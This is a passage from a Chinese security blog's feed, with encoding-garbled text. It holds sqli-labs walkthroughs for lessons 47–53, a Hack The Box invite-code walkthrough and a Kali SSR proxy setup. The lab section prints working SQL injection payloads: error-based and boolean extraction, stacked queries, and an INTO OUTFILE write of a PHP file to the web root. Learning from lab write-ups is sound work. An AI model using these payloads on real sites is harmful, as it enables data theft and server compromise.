<h2 id="0x10-Less-47-GET-åŸºäºæŠ¥é”™-å­—ç¬¦-order-by"><a href="#0x10-Less-47-GET-åŸºäºæŠ¥é”™-å­—ç¬¦-order-by" class="headerlink" title="0x10.Less-47 GET åŸºäºæŠ¥é”™ å­—ç¬¦ order by"></a>0x10.Less-47 GET åŸºäºæŠ¥é”™ å­—ç¬¦ order by</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=0&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202000047262.png" class>

<h2 id="0x11-Less-48-GET-åŸºäºbool-æ•°å­—-order-by"><a href="#0x11-Less-48-GET-åŸºäºbool-æ•°å­—-order-by" class="headerlink" title="0x11.Less-48 GET åŸºäºbool æ•°å­— order by"></a>0x11.Less-48 GET åŸºäºbool æ•°å­— order by</h2><p><code>è¿™é‡Œä½¿ç”¨rand()å‡½æ•°è¿›è¡Œå›æ˜¾åˆ¤æ–­</code></p>
<blockquote>
<p>rand(0)å¦‚ä¸‹</p>
</blockquote>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001551841.png" class>

<blockquote>
<p>rand(1)å¦‚ä¸‹</p>
</blockquote>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001610943.png" class>

<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=rand(left((select database()),1)=&#x27;a&#x27;)</span><br><span class="line">?sort=rand(left((select database()),1)=&#x27;s&#x27;)</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001526992.png" class>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001730347.png" class>

<blockquote>
<p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p>
</blockquote>
<h2 id="0x12-Less-49-GET-åŸºäºbool-å­—ç¬¦-order-by"><a href="#0x12-Less-49-GET-åŸºäºbool-å­—ç¬¦-order-by" class="headerlink" title="0x12.Less-49 GET åŸºäºbool å­—ç¬¦ order by"></a>0x12.Less-49 GET åŸºäºbool å­—ç¬¦ order by</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·ï¼Œæœ¬æ¬¡ä½¿ç”¨å¯¼å‡ºæ–‡ä»¶ä¸Šä¼ webshell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27; and into outfile &quot;/var/www/html/Less-49/demo.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œ3c3f7068700a706870696e666f28293b0a3f3eä¸º<?php phpinfo();?>çš„16è¿›åˆ¶</p>
</blockquote>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202004930920.png" class>

<h2 id="0x13-Less-50-åŸºäºæŠ¥é”™-GET-order-by-æ•°å­—-å †å æ³¨å…¥"><a href="#0x13-Less-50-åŸºäºæŠ¥é”™-GET-order-by-æ•°å­—-å †å æ³¨å…¥" class="headerlink" title="0x13.Less-50 åŸºäºæŠ¥é”™ GET order by æ•°å­— å †å æ³¨å…¥"></a>0x13.Less-50 åŸºäºæŠ¥é”™ GET order by æ•°å­— å †å æ³¨å…¥</h2><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œå°†mysql_query()å‡½æ•°æ¢ä¸ºäº†mysqli_multi_query()å‡½æ•° ï¼Œå¯ä»¥å¤šè¯­å¥æŸ¥è¯¢ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1;create table demo like users; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202111325863.png" class>

<p><code>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</code></p>
<h2 id="0x014-Less-51-åŸºäºæŠ¥é”™-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥"><a href="#0x014-Less-51-åŸºäºæŠ¥é”™-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥" class="headerlink" title="0x014.Less-51 åŸºäºæŠ¥é”™ GET order by å­—ç¬¦ å †å æ³¨å…¥"></a>0x014.Less-51 åŸºäºæŠ¥é”™ GET order by å­—ç¬¦ å †å æ³¨å…¥</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27;;create table demo like users; -- -</span><br></pre></td></tr></table></figure>

<h2 id="0x15-Less-52-åŸºäºbool-GET-order-by-æ•°å­—-å †å æ³¨å…¥"><a href="#0x15-Less-52-åŸºäºbool-GET-order-by-æ•°å­—-å †å æ³¨å…¥" class="headerlink" title="0x15.Less-52 åŸºäºbool GET order by æ•°å­— å †å æ³¨å…¥"></a>0x15.Less-52 åŸºäºbool GET order by æ•°å­— å †å æ³¨å…¥</h2><p><code>åŒä¸Šç›´æ¥å †å æ³¨å…¥å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1;create table hade like users; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202112340757.png" class>

<h2 id="0x16-Less-53-åŸºäºbool-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥"><a href="#0x16-Less-53-åŸºäºbool-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥" class="headerlink" title="0x16.Less-53 åŸºäºbool GET order by å­—ç¬¦ å †å æ³¨å…¥"></a>0x16.Less-53 åŸºäºbool GET order by å­—ç¬¦ å †å æ³¨å…¥</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·ï¼Œç›´æ¥å †å æ³¨å…¥å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1&#x27;;create table qq like users; -- -</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Sqli-labs</category>
      </categories>
      <tags>
        <tag>Sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBoxæ³¨å†Œ</title>
    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
    <content><![CDATA[<h2 id="0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box"><a href="#0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box" class="headerlink" title="0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box"></a>0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box</h2><blockquote>
<p>å®ƒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œç”¨äºæµ‹è¯•å’Œå¢å¼ºä½ çš„æ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½ã€‚å®ƒåŒ…å«ä¸€äº›ä¸æ–­æ›´æ–°çš„æŒ‘æˆ˜ã€‚å…¶ä¸­ä¸€äº›æ¨¡æ‹Ÿäº†ç°å®ä¸–ç•Œçš„åœºæ™¯ï¼Œè€Œå¦ä¸€äº›åˆ™æ›´å€¾å‘äºCTFçš„æŒ‘æˆ˜é£æ ¼ã€‚å¦‚æœä½ å¯¹ç½‘ç»œå®‰å…¨æˆ–ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œåˆ™åº”å°è¯•æ­¤ç«™ç‚¹ã€‚OKè®©æˆ‘ä»¬å¼€å§‹å§ï¼ï¼ï¼</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-é¦–å…ˆï¼Œè®¿é—®Hack-the-Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚"><a href="#0x01-é¦–å…ˆï¼Œè®¿é—®Hack-the-Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚" class="headerlink" title="0x01.é¦–å…ˆï¼Œè®¿é—®Hack the Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚"></a>0x01.é¦–å…ˆï¼Œè®¿é—®<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Boxç½‘ç«™ï¼Œ<i class="fa fa-external-link-alt"></i></span>å¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚</h2><h2 id="0x02-ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https-www-hackthebox-eu-é‚€è¯·åŠ å…¥HTBã€‚"><a href="#0x02-ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https-www-hackthebox-eu-é‚€è¯·åŠ å…¥HTBã€‚" class="headerlink" title="0x02.ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https://www.hackthebox.eu/é‚€è¯·åŠ å…¥HTBã€‚"></a>0x02.ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>é‚€è¯·åŠ å…¥HTBã€‚</h2><h2 id="0x03-å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚"><a href="#0x03-å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚" class="headerlink" title="0x03.å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚"></a>0x03.å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥<em>é‚€è¯·ç </em>ã€‚</h2><h3 id="01-æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°"><a href="#01-æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°" class="headerlink" title="01.æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°"></a>01.æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>

<h3 id="02-æ ¹æ®æç¤ºç»§ç»­"><a href="#02-æ ¹æ®æç¤ºç»§ç»­" class="headerlink" title="02.æ ¹æ®æç¤ºç»§ç»­"></a>02.æ ¹æ®æç¤ºç»§ç»­</h3><p><code>æŒ‘æˆ˜ç¬¬ä¸€æ­¥ï¼Œæ­¤é¡µé¢åŠ è½½ä¸€ä¸ªæœ‰è¶£çš„javascriptæ–‡ä»¶ã€‚çœ‹çœ‹ä½ èƒ½ä¸èƒ½æ‰¾åˆ°å®ƒï¼š</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>

<h3 id="03-å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶"><a href="#03-å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶" class="headerlink" title="03.å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶"></a>03.å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>

<h3 id="04-å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°"><a href="#04-å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°" class="headerlink" title="04.å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°"></a>04.å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>

<h3 id="05-åœ¨æ§åˆ¶å°è°ƒç”¨"><a href="#05-åœ¨æ§åˆ¶å°è°ƒç”¨" class="headerlink" title="05.åœ¨æ§åˆ¶å°è°ƒç”¨"></a>05.åœ¨æ§åˆ¶å°è°ƒç”¨</h3><p><code>å¯ä»¥çœ‹åˆ°200çŠ¶æ€ç ï¼Œå¯ä»¥çœ‹åˆ°dataä¸ºåŠ å¯†ä¸ºROT13(æœ‰æ—¶ä¹Ÿä¸ºbase64)</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>

<h3 id="06-è§£å¯†"><a href="#06-è§£å¯†" class="headerlink" title="06.è§£å¯†"></a>06.è§£å¯†</h3><p><code>å‘ç°è¦å‘é€POSTè¯·æ±‚</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>

<h3 id="07-å‘é€POSTè¯·æ±‚"><a href="#07-å‘é€POSTè¯·æ±‚" class="headerlink" title="07.å‘é€POSTè¯·æ±‚"></a>07.å‘é€POSTè¯·æ±‚</h3><p><code>å¾—åˆ°ä»¥=ç»“å°¾çš„æ•°æ®ï¼ŒçŒœæµ‹ä¸ºbase64</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>

<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>

<h3 id="08-è§£ç "><a href="#08-è§£ç " class="headerlink" title="08.è§£ç "></a>08.è§£ç </h3><p><code>å¾—åˆ°é‚€è¯·ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>

<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>

<h3 id="09-ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†"><a href="#09-ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†" class="headerlink" title="09.ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†"></a>09.ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†</h3><p><code>æ ¹æ®æç¤ºè¿›è¡Œè¿æ¥å³å¯</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class>

<p><code>ä¸‹å›¾ä¸ºè¿æ¥æˆåŠŸçŠ¶æ€</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliè®¾ç½®é…¸é…¸ä¹³</title>
    <url>/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>ç”±äºç»å¸¸éœ€è¦åœ¨vmä¸­ä½¿ç”¨kaliï¼Œå¹¶ä¸”è¦å¤§é‡ä¸‹è½½å›½å¤–èµ„æºï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ä¸ªæ»‹æ¶¦çš„ä»£ç†<br>æ˜¯ä¸èƒ½å¿å—çš„ï¼ä½ è¦ä½›ç³»å½“æˆ‘æ²¡è¯´ã€‚ã€‚ã€‚ä¸‹é¢æ¥è§£å†³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜</p>
</blockquote>
<a id="more"></a>

<h2 id="æµè§ˆå™¨ä»£ç†"><a href="#æµè§ˆå™¨ä»£ç†" class="headerlink" title="æµè§ˆå™¨ä»£ç†"></a>æµè§ˆå™¨ä»£ç†</h2><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a><strong>å‡†å¤‡å·¥ä½œ</strong></h3><blockquote>
<p>æœ‰å¯ç”¨çš„SSRè´¦å·ï¼Œå¯ä»¥é€‰æ‹©ç½‘ä¸Šå…è´¹åˆ†äº«çš„è´¦å·ï¼Œæˆ–è€…è‡ªå·±åœ¨VPSä¸Šæ­å»ºã€‚</p>
<p>è™šæ‹Ÿæœºç½‘å¡æ¨¡å¼ä¸ºæ¡¥æ¥</p>
</blockquote>
<h3 id="ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…"><a href="#ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…" class="headerlink" title="ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…"></a><strong>ä¸‹è½½SSRè„šæœ¬å¹¶å®‰è£…</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®SSR"><a href="#é…ç½®SSR" class="headerlink" title="é…ç½®SSR"></a><strong>é…ç½®SSR</strong></h3><p>ä¸€èˆ¬æƒ…å†µåªéœ€è¦ä¿®æ”¹ä»¥ä¸‹æœ‰æ³¨é‡Šçš„åœ°æ–¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,   //æœåŠ¡å™¨IPåœ°å€</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //ç«¯å£</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //å¯†ç </span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //åŠ å¯†æ–¹å¼</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //åè®®</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //åè®®å‚æ•°</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //æ··æ·†</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //æ··æ·†å‚æ•°</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a><strong>é…ç½®ä»£ç†</strong></h3><ul>
<li>ä»¥Firefoxä¸ºä¾‹ï¼ŒChromeä¸Šè®¾ç½®ç±»ä¼¼ã€‚</li>
<li>åœ¨åº”ç”¨å•†åº—æ‰¾åˆ°æ’ä»¶ <code>Proxy SwitchyOmega</code>ï¼Œæ·»åŠ è‡³Chrome</li>
<li>ç‚¹å‡» å›¾æ ‡ &gt;&gt; é€‰é¡¹ &gt;&gt; (å·¦è¾¹)æ–°å»ºæƒ…æ™¯æ¨¡å¼ ,é€‰ç¬¬ä¸€é¡¹ <code>ä»£ç†æœåŠ¡å™¨</code></li>
</ul>
<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class>

<h3 id="è®¾ç½®å¼€æœºå¯åŠ¨"><a href="#è®¾ç½®å¼€æœºå¯åŠ¨" class="headerlink" title="è®¾ç½®å¼€æœºå¯åŠ¨"></a><strong>è®¾ç½®å¼€æœºå¯åŠ¨</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ssrçš„å†…å®¹ä¸º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // ç¨‹åºåï¼Œå”¯ä¸€ã€‚</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // å¯åŠ¨é¡¹çš„ç®€çŸ­è¯´æ˜ï¼Œéšå¿ƒå†™ã€‚</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // å¯åŠ¨é¡¹çš„å®Œæ•´è¯´æ˜ï¼Œéšå¿ƒå†™ã€‚</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ä¸ºå¼€æœºè‡ªå¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤å¼€æœºå¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure>

<p>å¼€æœºæ‰‹åŠ¨å¼€å¯æˆ–å…³é—­</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //å¸è½½</span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a><strong>æµ‹è¯•</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class>


<h2 id="ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†"><a href="#ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†" class="headerlink" title="ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†"></a>ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†</h2><h3 id="ä½¿ç”¨proxychains"><a href="#ä½¿ç”¨proxychains" class="headerlink" title="ä½¿ç”¨proxychains"></a>ä½¿ç”¨proxychains</h3><p><code>proxychains</code>ç»ˆç«¯å‘½ä»¤è¡Œä»£ç†ç¥å™¨ï¼Œç§‘å­¦ä¸Šç½‘ï¼Œå†…ç½‘ç©¿é€æ¸—é€å¿…å¤‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ŒæŸå°¾ä¿®æ”¹è‡ªå·±çš„socks5æœ¬åœ°ä»£ç†åœ°å€å¾ˆç«¯å£ã€‚</p>
<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class>

<h3 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class>

<h3 id="ä½¿ç”¨privoxy"><a href="#ä½¿ç”¨privoxy" class="headerlink" title="ä½¿ç”¨privoxy"></a>ä½¿ç”¨privoxy</h3><p>ä½¿ç”¨Privoxyå®ç°ï¼Œæ­¤æ–¹æ³•åªæœ‰ä¸´æ—¶ç”Ÿæ•ˆ</p>
<p>é¦–å…ˆå®‰è£…privoxy</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¬¡ä½¿ç”¨å…¨å±€æ¨¡å¼ã€‚å…¨å±€æ¨¡å¼ï¼Œå°†æ‰€æœ‰http/httpsè¯·æ±‚èµ°ä»£ç†æœåŠ¡ã€‚</p>
<p>1.æ·»åŠ æœ¬åœ°ssræœåŠ¡åˆ°é…ç½®æ–‡ä»¶</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure>

<p>2.Privoxy é»˜è®¤ç›‘å¬ç«¯å£æ˜¯æ˜¯8118ï¼Œæ¯æ¬¡ä½¿ç”¨éƒ½éœ€è¦æ·»åŠ å¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure>

<p>3.å¯åŠ¨æœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure>

<p>no_proxyæ˜¯ä¸ç»è¿‡privoxyä»£ç†çš„åœ°å€<br>åªèƒ½å¡«å†™å…·ä½“çš„ipã€åŸŸååç¼€ï¼Œå¤šä¸ªæ¡ç›®ä¹‹é—´ä½¿ç”¨â€™,â€™é€—å·éš”å¼€<br>æ¯”å¦‚: export no_proxy=â€localhost, 192.168.1.1, ip.cn, chinaz.comâ€<br>è®¿é—® localhostã€192.168.1.1ã€ip.cnã€*.ip.cnã€chinaz.comã€*.chinaz.com å°†ä¸ä½¿ç”¨ä»£ç†</p>
</blockquote>
<p>æŸ¥çœ‹å‡ºå£é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class>

<h3 id="æµ‹è¯•-2"><a href="#æµ‹è¯•-2" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>å‡ºç°ç½‘é¡µæºç åˆ™ä¸ºæˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>tryhackme-[blue]</title>
    <url>/2021/01/15/tryhackme-blue/</url>
